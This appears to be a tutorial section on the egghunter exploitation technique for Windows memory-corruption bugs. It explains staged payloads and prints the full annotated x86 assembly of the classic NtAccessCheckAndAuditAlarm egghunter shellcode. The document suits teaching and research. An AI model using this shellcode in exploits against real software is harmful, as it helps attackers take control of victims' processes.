## General Information

In some cases, a vulnerability only provides us with a very small buffer that we can use after a memory corruption. 
In such cases, it can be difficult for the attacker to reliably position a larger payload at a predictable location in memory.

Sometimes, depending on the vulnerability or application, it's possible to store a larger payload somewhere else in the address space of the process. 
In a situation like this, the egghunter technique may be an effective exploitation methodology.


In other words, if we can store a second, larger buffer elsewhere, we can use our current, smaller buffer space to write a `stage one` shellcode.
The purpose of this shellcode would be to redirect the execution flow to that second buffer, where we will have more space to store a larger payload.

To determine what will be stored in memory by our vulnerable application, we could either perform a very in-depth reverse engineering process on the application, which is out of the scope of this module, or we could make some educated guesses based on the type of application we are attacking.

## The Egghunter Approach

- http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

When we need to find the memory address of another buffer under our control that is not static, we often use an `Egghunter`.
This term refers to a small first-stage payload that can search the process virtual address space (`VAS`) for an `egg`, a unique tag that prepends the payload we want to execute. 
Once the `eg`g is found, the `egghunter` transfers the execution to the final shellcode by jumping to the found address. 
One of the first implementations of this technique can be found in a paper written by Matt Miller in 2004.

Since `egghunters` are often used when dealing with space restrictions, they are written to be as small as possible. Additionally, the speed of the `egghunter` is essential; the faster the `egghunter` finds the unique tag, the less time the application will hang.

These type of payloads also need to be robust and handle access violations that are raised while scanning the virtual address space. 
The access violations usually occur while attempting to access an unmapped memory address or addresses we don't have access to.

In the past, we would typically write the assembly code for our egghunter and then proceed to compile the code. After, we would disassemble the compiled binary in software such as IDA to get the opcodes for it.
Fortunately, we have a better alternative.

## Egghunter Code

The original egghunter code is as follows. It searches the memory space for the egg using the `NtAccessCheckAndAuditAlarm` system call, puts the found memory address into the `edi` register and then jumps to it. It uses a hardcoded system call though, so be careful with that.

You can generate opcodes from this instructions using the [keystone engine](https://www.keystone-engine.org/).

```text
# We use the edx register as a memory page counter

loop_inc_page:
    
    # Go to the last address in the memory page
    or dx, 0x0fff;
loop_inc_one:
    
    # Increase the memory counter by one
    inc edx;
loop_check:
    
    # Save the edx register which holds our memory 
    # address on the stack
    push edx;
    
    # Push the system call number
    push 0x2;
    
    # Initialize the call to NtAccessCheckAndAuditAlarm
    pop eax;
    
    # Perform the system call
    int 0x2e;
    
    # Check for access violation, 0xc0000005
    # (ACCESS_VIOLATION)
    cmp al,05;

    # Restore the edx register to check later
    # for our egg
    pop edx;
loop_check_valid:
    
    # If access violation encountered, go to n
    # ext page
    je loop_inc_page;
is_egg:
    
    # Load egg (w00t in this example) into
    # the eax register
    mov eax, 0x74303077	;
    
    # Initializes pointer with current checked
    # address
    mov edi, edx;
    
    # Compare eax with doubleword at edi and
    # set status flags
    scasd;
    
    # No match, we will increase our memory
    # counter by one
    jnz loop_inc_one;
    
    # First part of the egg detected, check for
    # the second part
    scasd;
    
    # No match, we found just a location
    # with half an egg
    jnz loop_inc_one;
matched:
    
    # The edi register points to the first
    # byte of our buffer, we can jump to it
    jmp edi;
```

